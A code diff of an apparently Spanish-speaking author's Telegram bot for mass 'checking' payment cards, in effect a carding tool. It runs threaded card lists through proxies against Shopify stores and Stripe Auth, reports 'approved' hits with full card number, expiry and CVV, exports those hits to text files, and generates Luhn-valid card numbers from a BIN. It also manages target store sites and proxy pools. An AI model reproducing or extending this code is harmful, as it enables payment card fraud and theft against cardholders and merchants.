+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💳 *Card:* `{last_card}`
+📝 *Response:* `{last_response}`
+💲 *Price:* `{last_price}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💰 Charge: *{stats['charge']}*  │  ✅ Approved: *{total_approved}*
+❌ Declined: *{stats['declined']}*  │  📊 `[{completed}/{total}]`"""
+                
+                if not stop_mass_flag:
+                    try:
+                        bot.edit_message_text(update_text, chat_id=chat_id, message_id=msg_id,
+                                            parse_mode='Markdown', reply_markup=control_buttons)
+                    except:
+                        pass
+        
+        start_time = time.time()
+        
+        while completed < total and not stop_mass_flag:
+            try:
+                result_data = result_queue.get(timeout=0.5)
+                
+                if result_data[0] == 'error':
+                    card_str = result_data[1]
+                    if card_str in processed_cards:
+                        continue
+                    processed_cards.add(card_str)
+                    completed += 1
+                    stats['errors'] += 1
+                    delete_card(card_str)
+                    update_counter += 1
+                    send_update()
+                else:
+                    _, card_str, result, worker_id, cc, month, year, cvv, bin_info = result_data
+                    
+                    if card_str in processed_cards:
+                        continue
+                    processed_cards.add(card_str)
+                    
+                    category, status_msg, response_msg, price, gateway, elapsed, site_used = result
+                    
+                    last_card = f"{cc[:6]}******{cc[-4:]}"
+                    last_response = response_msg if response_msg else status_msg
+                    last_price = price
+                    last_bin_info = bin_info
+                    
+                    if category in ['CHARGE', '3DS', 'CVV', 'FUNDS']:
+                        if category == 'CHARGE':
+                            stats['charge'] += 1
+                        elif category == '3DS':
+                            stats['threeds'] += 1
+                        elif category == 'CVV':
+                            stats['cvv'] += 1
+                        elif category == 'FUNDS':
+                            stats['funds'] += 1
+                        
+                        icon, cat_display, dot = get_status_emoji(category)
+                        hit_msg = f"""{dot} *SHOPIFY ─ APPROVED* {dot}
+{LINE_THIN}
+💳 `{cc}|{month}|{year}|{cvv}`
+🌐 {gateway}
+📝 {response_msg}
+💲 {price}
+{LINE_THIN}"""
+                        
+                        try:
+                            bot.send_message(chat_id, hit_msg, parse_mode='Markdown')
+                        except:
+                            bot.send_message(chat_id, hit_msg.replace('`', '').replace('*', ''))
+                        
+                        hit_data = {
+                            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
+                            'category': category, 'status_msg': response_msg,
+                            'gateway': gateway, 'price': price, 'elapsed': elapsed,
+                            'bin_info': bin_info,
+                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                        }
+                        save_hit(hit_data)
+                    elif category == 'DECLINED':
+                        stats['declined'] += 1
+                    else:
+                        stats['errors'] += 1
+                    
+                    completed += 1
+                    delete_card(card_str)
+                    update_counter += 1
+                    send_update()
+                    
+            except:
+                continue
+        
+        for w in workers:
+            try:
+                w.join(timeout=2)
+            except:
+                pass
+        
+        elapsed = time.time() - start_time
+        minutes, seconds = int(elapsed // 60), int(elapsed % 60)
+        total_approved = stats['charge'] + stats['threeds'] + stats['cvv'] + stats['funds']
+        
+        try:
+            sqlite_backup.update_daily_stats(completed, total_approved, stats['declined'], stats['errors'], 0, 0, current_mode)
+        except:
+            pass
+        
+        was_stopped = stop_mass_flag
+        status_label = "🛑 *MASS CHECK STOPPED*" if was_stopped else "🏁 *MASS CHECK COMPLETED*"
+        
+        final_bar = create_progress_bar(completed, total)
+        final_text = f"""🛒 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{status_label}
+
+`{final_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💰 *Charge:* {stats['charge']}
+✅ *Approved:* {total_approved}
+❌ *Declined:* {stats['declined']}
+📊 *Total:* {completed}
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+⏱ *Time:* {minutes}m {seconds}s"""
+        
+        result_keyboard = InlineKeyboardMarkup()
+        result_keyboard.row(
+            InlineKeyboardButton("🏆 Ver Hits", callback_data="hits"),
+            InlineKeyboardButton("📦 Nuevo Mass", callback_data="mass")
+        )
+        
+        try:
+            bot.edit_message_text(final_text, chat_id=chat_id, message_id=msg_id,
+                                parse_mode='Markdown', reply_markup=result_keyboard)
+        except:
+            pass
+    
+    t = threading.Thread(target=run_shopify_mass, args=(message.chat.id, progress_msg.message_id))
+    t.daemon = True
+    t.start()
+
+# ============================================
+# MASS CHECK STRIPE AUTH (CON BOTONES SOLO STOP Y UPDATE CADA 5 CHK)
+# ============================================
+
+@bot.message_handler(commands=['mau'])
+def stripe_mass_command(message):
+    """Mass check con Stripe Auth - Estilo foto"""
+    global stripe_mass_running, stop_mass_flag, current_mass_msg, current_mass_chat_id, mass_paused
+    
+    if stripe_mass_running:
+        bot.reply_to(message, "⚠️ Stripe Auth mass check already in progress. Use STOP button or /stop")
+        return
+    
+    cards = get_all_stripe_cards()
+    if not cards:
+        bot.reply_to(message, "❌ No Stripe Auth cards saved. Send a .txt file with 'au' or 'stripe' in the name.")
+        return
+    
+    total = len(cards)
+    
+    stop_mass_flag = False
+    mass_paused = False
+    stripe_mass_running = True
+    
+    # Botones estilo foto - SOLO STOP
+    control_buttons = InlineKeyboardMarkup(row_width=1)
+    control_buttons.add(
+        InlineKeyboardButton("🛑 DETENER MASS CHECK", callback_data="stop_mass")
+    )
+    
+    progress_bar = create_progress_bar(0, total)
+    msg_text = f"""🔓 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ *STRIPE AUTH MASS CHECK* ─ FREE
+
+`{progress_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💳 *Card:* `WAITING...`
+📝 *Response:* `CONNECTING...`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💚 Live: *0*  │  🔐 3DS: *0*  │  🔶 CVV: *0*
+❌ Declined: *0*  │  📊 `[0/{total}]`"""
+    
+    progress_msg = safe_send_message(message.chat.id, msg_text, parse_mode='Markdown', reply_markup=control_buttons)
+    
+    current_mass_msg = progress_msg
+    current_mass_chat_id = message.chat.id
+    
+    def run_stripe_mass(chat_id, msg_id):
+        global stripe_mass_running, stop_mass_flag
+        
+        try:
+            _run_stripe_mass_inner(chat_id, msg_id)
+        finally:
+            stripe_mass_running = False
+            stop_mass_flag = False
+    
+    def _run_stripe_mass_inner(chat_id, msg_id):
+        global stripe_mass_running, stop_mass_flag
+        
+        stats = {
+            'live': 0, 'threeds': 0, 'cvv': 0,
+            'declined': 0, 'errors': 0, 'total': total
+        }
+        
+        completed = 0
+        last_card = "WAITING..."
+        last_response = "CONNECTING..."
+        last_price = "FREE"
+        
+        task_queue = Queue()
+        result_queue = Queue()
+        
+        for card_str in cards:
+            task_queue.put(card_str)
+        
+        for _ in range(STRIPE_AUTH_WORKERS):
+            task_queue.put(None)
+        
+        def stripe_worker(worker_id):
+            while not stop_mass_flag:
+                if mass_paused:
+                    time.sleep(1)
+                    continue
+                try:
+                    card_str = task_queue.get(timeout=1)
+                    if card_str is None:
+                        break
+                    
+                    parts = card_str.split('|')
+                    if len(parts) < 4:
+                        result_queue.put(('error', card_str, None, worker_id))
+                        continue
+                    
+                    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+                    bin_info = bin_lookup(cc[:6])
+                    result = check_stripe_auth(cc, month, year, cvv)
+                    result_queue.put(('success', card_str, result, worker_id, cc, month, year, cvv, bin_info))
+                except:
+                    continue
+        
+        workers = []
+        for i in range(STRIPE_AUTH_WORKERS):
+            w = threading.Thread(target=stripe_worker, args=(i,))
+            w.daemon = True
+            w.start()
+            workers.append(w)
+        
+        processed_cards = set()
+        update_counter = 0
+        
+        def send_update():
+            nonlocal last_card, last_response, last_price, update_counter
+            
+            total_approved = stats['live'] + stats['threeds'] + stats['cvv']
+            
+            if update_counter % 5 == 0 or update_counter == 0 or completed == total:
+                progress_bar = create_progress_bar(completed, total)
+                update_text = f"""🔓 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ *STRIPE AUTH MASS CHECK* ─ FREE
+
+`{progress_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💳 *Card:* `{last_card}`
+📝 *Response:* `{last_response}`
+💲 *Price:* `{last_price}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💚 Live: *{stats['live']}*  │  🔐 3DS: *{stats['threeds']}*  │  🔶 CVV: *{stats['cvv']}*
+❌ Declined: *{stats['declined']}*  │  📊 `[{completed}/{total}]`"""
+                
+                if not stop_mass_flag:
+                    try:
+                        bot.edit_message_text(update_text, chat_id=chat_id, message_id=msg_id,
+                                            parse_mode='Markdown', reply_markup=control_buttons)
+                    except:
+                        pass
+        
+        start_time = time.time()
+        
+        while completed < total and not stop_mass_flag:
+            try:
+                result_data = result_queue.get(timeout=0.5)
+                
+                if result_data[0] == 'error':
+                    card_str = result_data[1]
+                    if card_str in processed_cards:
+                        continue
+                    processed_cards.add(card_str)
+                    completed += 1
+                    stats['errors'] += 1
+                    delete_stripe_card(card_str)
+                    update_counter += 1
+                    send_update()
+                else:
+                    _, card_str, result, worker_id, cc, month, year, cvv, bin_info = result_data
+                    
+                    if card_str in processed_cards:
+                        continue
+                    processed_cards.add(card_str)
+                    
+                    category, status_msg, response_msg, price, gateway, elapsed = result
+                    
+                    last_card = f"{cc[:6]}******{cc[-4:]}"
+                    last_price = price if price else "FREE"
+                    clean_response = response_msg
+                    if clean_response.startswith('[unknown]'):
+                        clean_response = clean_response.replace('[unknown]', '').strip()
+                    elif clean_response.startswith('unknown'):
+                        clean_response = clean_response.replace('unknown', '').strip()
+                    last_response = clean_response if clean_response else status_msg
+                    
+                    if category in ['LIVE', '3DS', 'CVV']:
+                        if category == 'LIVE':
+                            stats['live'] += 1
+                        elif category == '3DS':
+                            stats['threeds'] += 1
+                        elif category == 'CVV':
+                            stats['cvv'] += 1
+                        
+                        icon, cat_display, dot = get_status_emoji(category)
+                        hit_msg = f"""{dot} *STRIPE AUTH ─ {cat_display}* {dot}
+{LINE_THIN}
+💳 `{cc}|{month}|{year}|{cvv}`
+🌐 {gateway}
+📝 {clean_response}
+💲 {price}
+{LINE_THIN}"""
+                        
+                        try:
+                            bot.send_message(chat_id, hit_msg, parse_mode='Markdown')
+                        except:
+                            bot.send_message(chat_id, hit_msg.replace('`', '').replace('*', ''))
+                        
+                        hit_data = {
+                            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
+                            'category': category, 'status_msg': status_msg,
+                            'response_msg': clean_response,
+                            'gateway': gateway, 'price': price, 'elapsed': elapsed,
+                            'bin_info': bin_info,
+                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                        }
+                        save_stripe_hit(hit_data)
+                    elif category == 'DECLINED':
+                        stats['declined'] += 1
+                    else:
+                        stats['errors'] += 1
+                    
+                    completed += 1
+                    delete_stripe_card(card_str)
+                    update_counter += 1
+                    send_update()
+                    
+            except:
+                continue
+        
+        for w in workers:
+            try:
+                w.join(timeout=2)
+            except:
+                pass
+        
+        elapsed = time.time() - start_time
+        minutes, seconds = int(elapsed // 60), int(elapsed % 60)
+        total_approved = stats['live'] + stats['threeds'] + stats['cvv']
+        
+        try:
+            sqlite_backup.update_daily_stats(0, 0, 0, 0, completed, total_approved, current_mode)
+        except:
+            pass
+        
+        was_stopped = stop_mass_flag
+        status_label = "🛑 *STRIPE AUTH STOPPED*" if was_stopped else "🏁 *STRIPE AUTH COMPLETED*"
+        
+        final_bar = create_progress_bar(completed, total)
+        final_text = f"""🔓 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{status_label}
+
+`{final_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💚 *Live:* {stats['live']}
+🔐 *3DS:* {stats['threeds']}
+🔶 *CVV:* {stats['cvv']}
+❌ *Declined:* {stats['declined']}
+📊 *Total:* {completed}
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+⏱ *Time:* {minutes}m {seconds}s"""
+        
+        result_keyboard = InlineKeyboardMarkup()
+        result_keyboard.row(
+            InlineKeyboardButton("🔓 Ver AU Hits", callback_data="stripe_hits"),
+            InlineKeyboardButton("🔓 Nuevo AU Mass", callback_data="stripe_mass")
+        )
+        
+        try:
+            bot.edit_message_text(final_text, chat_id=chat_id, message_id=msg_id,
+                                parse_mode='Markdown', reply_markup=result_keyboard)
+        except:
+            pass
+    
+    t = threading.Thread(target=run_stripe_mass, args=(message.chat.id, progress_msg.message_id))
+    t.daemon = True
+    t.start()
+
+# ============================================
+# HITS COMMANDS
+# ============================================
+
+@bot.message_handler(commands=['auhits'])
+def stripe_hits_command(message):
+    hits = get_stripe_hits()
+    if not hits:
+        bot.reply_to(message, "📭 No Stripe Auth approved cards yet.")
+        return
+    
+    content = "═" * 50 + "\n"
+    content += f"  🔓 STRIPE AUTH {BOT_VERSION} - APPROVED CARDS (FREE)\n"
+    content += f"  📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+    content += "═" * 50 + "\n\n"
+    
+    for i, hit in enumerate(hits, 1):
+        content += f"━━ [{i}] {hit.get('category', 'UNKNOWN')} ━━\n"
+        content += f"  💳 CC: {hit.get('cc', '')}|{hit.get('month', '')}|{hit.get('year', '')}|{hit.get('cvv', '')}\n"
+        content += f"  📝 Status: {hit.get('status_msg', '')}\n"
+        content += f"  📝 Response: {hit.get('response_msg', '')}\n"
+        content += f"  💲 Price: {hit.get('price', 'FREE')}\n"
+        content += f"  🌐 Gateway: {hit.get('gateway', 'Stripe Auth')}\n"
+        content += f"  ⏱ Time: {hit.get('elapsed', 0)}s\n"
+        if hit.get('bin_info'):
+            content += f"  🏦 BIN: {hit.get('bin_info', {}).get('info', '')}\n"
+            content += f"  🏦 Bank: {hit.get('bin_info', {}).get('bank', '')}\n"
+            content += f"  🌍 Country: {hit.get('bin_info', {}).get('country', '')}\n"
+        content += "┄" * 40 + "\n\n"
+    
+    content += "═" * 50 + "\n"
+    content += f"  🏆 TOTAL STRIPE HITS: {len(hits)}\n"
+    content += "═" * 50 + "\n"
+    
+    file_data = BytesIO(content.encode('utf-8'))
+    file_data.name = f"stripe_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    bot.send_document(message.chat.id, file_data, caption=f"🔓 {len(hits)} Stripe Auth approved cards")
+
+@bot.message_handler(commands=['clearau'])
+def clear_stripe_command(message):
+    count = len(get_all_stripe_cards())
+    if count == 0:
+        bot.reply_to(message, "📭 No Stripe Auth cards to delete.")
+        return
+    
+    markup = InlineKeyboardMarkup()
+    markup.add(
+        InlineKeyboardButton("✅ YES", callback_data="confirm_clear_stripe"),
+        InlineKeyboardButton("❌ NO", callback_data="cancel_clear")
+    )
+    bot.reply_to(message, f"⚠️ *CONFIRM DELETE*\n\nDelete {count} Stripe Auth cards?\nThis action cannot be undone.", 
+                 parse_mode='Markdown', reply_markup=markup)
+
+@bot.message_handler(commands=['clearshopify'])
+def clear_shopify_command(message):
+    count = len(get_all_cards())
+    if count == 0:
+        bot.reply_to(message, "📭 No Shopify cards to delete.")
+        return
+    
+    markup = InlineKeyboardMarkup()
+    markup.add(
+        InlineKeyboardButton("✅ YES", callback_data="confirm_clear_shopify"),
+        InlineKeyboardButton("❌ NO", callback_data="cancel_clear")
+    )
+    bot.reply_to(message, f"⚠️ *CONFIRM DELETE*\n\nDelete {count} Shopify cards?\nThis action cannot be undone.", 
+                 parse_mode='Markdown', reply_markup=markup)
+
+@bot.message_handler(commands=['stop'])
+def stop_mass_check(message):
+    global mass_check_running, stripe_mass_running, sc_mass_running, b3_mass_running, stop_mass_flag
+    if mass_check_running or stripe_mass_running or sc_mass_running or b3_mass_running:
+        stop_mass_flag = True
+        bot.reply_to(message, f"🛑 *Stopping mass check...*\n{LINE_THIN}\nPlease wait while workers finish...", parse_mode='Markdown')
+        try:
+            if current_mass_msg and current_mass_chat_id:
+                bot.edit_message_text(f"""🛑 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⏳ *STOPPING MASS CHECK...*
+
+Please wait while workers finish...""",
+                    chat_id=current_mass_chat_id, message_id=current_mass_msg.message_id,
+                    parse_mode='Markdown')
+        except:
+            pass
+        def force_reset():
+            global mass_check_running, stripe_mass_running, sc_mass_running, b3_mass_running, stop_mass_flag
+            time.sleep(15)
+            mass_check_running = False
+            stripe_mass_running = False
+            sc_mass_running = False
+            b3_mass_running = False
+            stop_mass_flag = False
+        t = threading.Thread(target=force_reset, daemon=True)
+        t.start()
     else:
-        msg = await update.message.reply_text(progress_text)
+        bot.reply_to(message, "ℹ️ No active mass check")
+
+@bot.message_handler(commands=['stats'])
+def show_stats(message):
+    sites = load_sites()
+    proxies = load_proxies()
+    cards = get_all_cards()
+    stripe_cards = get_all_stripe_cards()
+    sc_cards = get_all_sc_cards()
+    b3_cards = get_all_b3_cards()
+    hits = get_hits()
+    stripe_hits = get_stripe_hits()
+    sc_hits_data = get_sc_hits()
+    b3_hits_data = get_b3_hits()
+    permanent = sqlite_backup.get_permanent_sites()
     
-    result = await card_service.donate_givewp_anti_block(user_id, card_data, amount)
+    stats_text = f"""📊 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📈 *STATISTICS PANEL*
+
+🛒 *━━ SHOPIFY ━━*
+   ├ 💳 Queued: *{len(cards)}*
+   ├ 🏆 Hits: *{len(hits)}*
+   ├ 🌐 Sites: *{len(sites)}*
+   └ 🔒 Permanent: *{len(permanent)}*
+
+🔓 *━━ STRIPE AUTH (FREE) ━━*
+   ├ 💳 Queued: *{len(stripe_cards)}*
+   └ 🏆 Hits: *{len(stripe_hits)}*
+
+💳 *━━ STRIPE CHARGE ━━*
+   ├ 💳 Queued: *{len(sc_cards)}*
+   └ 🏆 Hits: *{len(sc_hits_data)}*
+
+🔐 *━━ BRAINTREE AUTH ━━*
+   ├ 💳 Queued: *{len(b3_cards)}*
+   └ 🏆 Hits: *{len(b3_hits_data)}*
+
+⚙️ *━━ SYSTEM ━━*
+   ├ 📡 Proxies: *{len(proxies)}*
+   ├ 👷 Workers: *{current_max_workers}*
+   └ 🎮 Mode: *{current_mode}* ({PARALLEL_WORKERS}x)
+┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
+🤖 {BOT_NAME} {BOT_VERSION} │ /help"""
+    safe_send_message(message.chat.id, stats_text, parse_mode='Markdown')
+
+@bot.message_handler(commands=['hits'])
+def hits_command(message):
+    hits = get_hits()
+    if not hits:
+        bot.reply_to(message, "📭 No Shopify approved cards yet.")
+        return
+    content = export_hits_txt()
+    if content:
+        file_data = BytesIO(content.encode('utf-8'))
+        file_data.name = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        bot.send_document(message.chat.id, file_data, caption=f"🏆 {len(hits)} Shopify approved cards")
+
+@bot.message_handler(commands=['px'])
+def proxy_check_command(message):
+    proxies = load_proxies()
+    if not proxies:
+        bot.reply_to(message, "⚠️ No proxies to check")
+        return
+    total = len(proxies)
+    msg = bot.reply_to(message, f"⏳ Deep checking {total} proxies (3-level verification)...")
+    start_time = time.time()
+    alive, dead, reasons = verify_proxy_batch(proxies, deep=True)
+    elapsed = time.time() - start_time
+    global last_dead_proxies
+    last_dead_proxies = dead
     
-    emoji = get_status_emoji(result.status)
-    confidence_icon = get_confidence_icon(result.confidence)
+    socket_fail = sum(1 for r in reasons.values() if r == 'SOCKET_FAIL')
+    http_fail = sum(1 for r in reasons.values() if r == 'HTTP_FAIL')
+    request_fail = sum(1 for r in reasons.values() if r == 'REQUEST_FAIL')
+    timeout_fail = sum(1 for r in reasons.values() if r == 'TIMEOUT')
     
-    reason_escaped = escape_markdown(result.reason)
-    status_escaped = escape_markdown(result.status.value.upper())
-    confidence_escaped = escape_markdown(result.confidence.value)
+    summary = f"""📡 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔍 *DEEP PROXY CHECK ─ 3 LEVELS*
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+⚡ *Speed:* {total/elapsed:.1f} proxies/s
+⏱ *Time:* {elapsed:.1f}s
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+✅ *Alive (all 3 tests passed):* {len(alive)}
+💀 *Dead:* {len(dead)}
+📊 *Total:* {total}
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+🔬 *Failure Breakdown:*
+   ├ 🔌 Socket fail: {socket_fail}
+   ├ 🌐 HTTP tunnel fail: {http_fail}
+   ├ 📡 Request fail: {request_fail}
+   └ ⏱ Timeout: {timeout_fail}
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+📋 *Verification Levels:*
+   1️⃣ TCP Socket Connection
+   2️⃣ HTTP CONNECT Tunnel
+   3️⃣ Real HTTPS Request
+┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
+🤖 {BOT_NAME} {BOT_VERSION} │ /help"""
+    markup = InlineKeyboardMarkup()
+    if dead:
+        markup.add(InlineKeyboardButton("🗑️ DELETE DEAD PROXIES", callback_data="delete_dead_proxies"))
+    try:
+        bot.edit_message_text(summary, chat_id=message.chat.id, message_id=msg.message_id, 
+                            parse_mode='Markdown', reply_markup=markup if markup.keyboard else None)
+    except:
+        bot.edit_message_text(summary.replace('*', ''), chat_id=message.chat.id, 
+                            message_id=msg.message_id, reply_markup=markup if markup.keyboard else None)
+
+@bot.message_handler(commands=['addsite'])
+def add_site_command(message):
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        bot.reply_to(message, "❌ Usage: /addsite store.myshopify.com")
+        return
+    url = clean_url(args[1].strip())
+    if not url:
+        bot.reply_to(message, "❌ Invalid URL")
+        return
+    if add_site(url):
+        bot.reply_to(message, f"✅ Site added:\n{url}")
+    else:
+        bot.reply_to(message, "⚠️ Site already exists")
+
+@bot.message_handler(commands=['listsites'])
+def list_sites_command(message):
+    sites = load_sites()
+    if not sites:
+        bot.reply_to(message, "❌ No sites saved")
+        return
     
-    response = (
-        f"{emoji} *DONACIÓN COMPLETADA*\n"
-        f"━━━━━━━━━━━━━━━━━━\n\n"
-        f"💰 Monto: ${amount:.2f}\n"
-        f"📊 Estado: {status_escaped}\n"
-        f"{confidence_icon} Confianza: {confidence_escaped}\n"
-        f"📝 Razón: {reason_escaped}\n"
-        f"⏱️ Tiempo: {result.response_time:.1f}s\n\n"
-        f"💳 Tarjeta: {card_data['bin']}xxxxxx{card_data['last4']}"
+    permanent_urls = [s['url'] for s in sqlite_backup.get_permanent_sites()]
+    permanent_sites = [s for s in sites if s in permanent_urls]
+    normal_sites = [s for s in sites if s not in permanent_urls]
+    
+    response = f"🌐 *{BOT_NAME} ─ SITES ({len(sites)})*\n{LINE_DASH}\n\n"
+    
+    if permanent_sites:
+        response += "🔒 *PERMANENT (never removed):*\n"
+        for i, site in enumerate(permanent_sites[:10], 1):
+            response += f"  {i}. `{site}`\n"
+        if len(permanent_sites) > 10:
+            response += f"  _... and {len(permanent_sites) - 10} more_\n"
+        response += "\n"
+    
+    if normal_sites:
+        response += "🔄 *NORMAL:*\n"
+        for i, site in enumerate(normal_sites[:20], len(permanent_sites) + 1):
+            response += f"  {i}. `{site}`\n"
+        if len(normal_sites) > 20:
+            response += f"  _... and {len(normal_sites) - 20} more_\n"
+    
+    response += f"\n{LINE_THIN}\n💡 Use `/addsite url` to add │ `/listsites` to view"
+    safe_send_message(message.chat.id, response, parse_mode='Markdown')
+
+@bot.message_handler(commands=['gen'])
+def gen_command(message):
+    """Comando /gen - Generar tarjetas válidas con algoritmo de Luhn"""
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "❌ Format: /gen 424242 [amount]\nExample: /gen 424242 10")
+        return
+    
+    bin_prefix = args[1].strip()
+    if not bin_prefix.isdigit() or len(bin_prefix) < 6:
+        bot.reply_to(message, "❌ Invalid BIN. Must be at least 6 digits. Example: /gen 424242")
+        return
+    
+    count = 10
+    if len(args) >= 3:
+        try:
+            count = min(int(args[2]), 50)
+            count = max(1, count)
+        except ValueError:
+            count = 10
+    
+    processing_msg = bot.reply_to(message, f"⚙️ *Generating {count} cards with Luhn algorithm...*", parse_mode='Markdown')
+    
+    cards = generate_cards_from_bin(bin_prefix, count)
+    bin_info = bin_lookup(bin_prefix[:6])
+    
+    # Send txt file with generated cards
+    file_content = '\n'.join(cards)
+    file_data = BytesIO(file_content.encode('utf-8'))
+    file_data.name = f"gen_{bin_prefix}x{count}.txt"
+    bot.send_document(message.chat.id, file_data, caption=f"🎲 {len(cards)} cards generated from BIN {bin_prefix}")
+    
+    response = _format_gen_response(bin_prefix, count, cards, bin_info)
+    
+    regen_markup = InlineKeyboardMarkup()
+    regen_markup.row(
+        InlineKeyboardButton("🔄 Regenerate", callback_data=f"regen_{bin_prefix}_{count}"),
+        InlineKeyboardButton("📋 Copy All", callback_data=f"gencopy_{bin_prefix}_{count}")
     )
     
     try:
-        await msg.edit_text(response, parse_mode="Markdown")
-    except Exception as e:
-        await msg.edit_text(response.replace('*', '').replace('_', ''))
+        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown', reply_markup=regen_markup)
+    except:
+        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id, reply_markup=regen_markup)
 
-async def donate5(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    context.args = ["5"]
-    await donate(update, context)
+def _format_gen_response(bin_prefix, count, cards, bin_info):
+    cards_text = '\n'.join([f"`{c}`" for c in cards])
+    
+    if bin_info:
+        return f"""{get_bot_header('shopify')}
 
-async def donate10(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    context.args = ["10"]
-    await donate(update, context)
+🎲 *CARD GENERATOR ─ LUHN*
+{LINE_DOT}
+💳 {stylize_text('BIN')}  ➜  `{bin_prefix}`
+🔢 {stylize_text('Amount')}  ➜  {len(cards)}
 
-async def donate20(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    context.args = ["20"]
-    await donate(update, context)
+📋 *{stylize_text('BIN Info')}*
+   ├ {stylize_text('Brand')}: {bin_info.get('brand', 'Unknown')}
+   ├ {stylize_text('Type')}: {bin_info.get('type', 'Unknown')}
+   ├ {stylize_text('Bank')}: {bin_info.get('bank', 'Unknown')}
+   └ {stylize_text('Country')}: {bin_info.get('country', 'Unknown')}
 
-# ================== MANEJO DE BOTONES ==================
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    data = query.data
-    user_id = update.effective_user.id
-    
-    if user_id in active_mass and data != "mass_stop":
-        await query.edit_message_text("❌ Mass check en progreso")
-        return
-    
-    if data == "menu_main":
-        await show_main_menu(update, context, edit=True)
-    elif data == "menu_check":
-        await show_check_menu(update, context)
-    elif data == "menu_mass":
-        await show_mass_menu(update, context)
-    elif data == "menu_donate":
-        await show_donate_menu(update, context)
-    elif data == "menu_stripe":
-        await show_stripe_menu(update, context)
-    elif data == "menu_analyzer":
-        await show_analyzer_menu(update, context)
-    elif data == "menu_sites":
-        await show_sites_menu(update, context)
-    elif data == "menu_proxies":
-        await show_proxies_menu(update, context)
-    elif data == "menu_cards":
-        await show_cards_menu(update, context)
-    elif data == "menu_stats":
-        await show_stats(update, context)
-    elif data == "menu_settings":
-        await show_settings(update, context)
-    elif data == "donate_5":
-        context.args = ["5"]
-        await donate(update, context)
-    elif data == "donate_10":
-        context.args = ["10"]
-        await donate(update, context)
-    elif data == "donate_20":
-        context.args = ["20"]
-        await donate(update, context)
+💳 *{stylize_text('Generated Cards')}*
+{cards_text}
 
-# ================== MANEJO DE MENSAJES ==================
-async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    text = update.message.text
-    
-    if user_id in active_mass:
-        await update.message.reply_text("❌ Mass check en progreso")
-        return
-    
-    # Verificar si es comando /donate sin argumentos
-    if text.startswith('/donate') and not text.startswith('/donate5') and not text.startswith('/donate10') and not text.startswith('/donate20'):
-        await donate(update, context)
-        return
-    
-    card_data = CardValidator.parse_card(text)
-    if card_data:
-        user_data = await user_manager.get_user_data(user_id)
-        
-        if not user_data["sites"] or not user_data["proxies"]:
-            await update.message.reply_text("❌ Necesitas sites y proxies para Shopify")
-            return
-        
-        allowed, msg = await user_manager.check_rate_limit(user_id, "check")
-        if not allowed:
-            await update.message.reply_text(msg)
-            return
-        
-        msg = await update.message.reply_text("🔄 Verificando en Shopify...")
-        
-        site = user_data["sites"][0]
-        proxy = user_data["proxies"][0]
-        
-        result = await card_service.check_shopify(user_id, card_data, site, proxy)
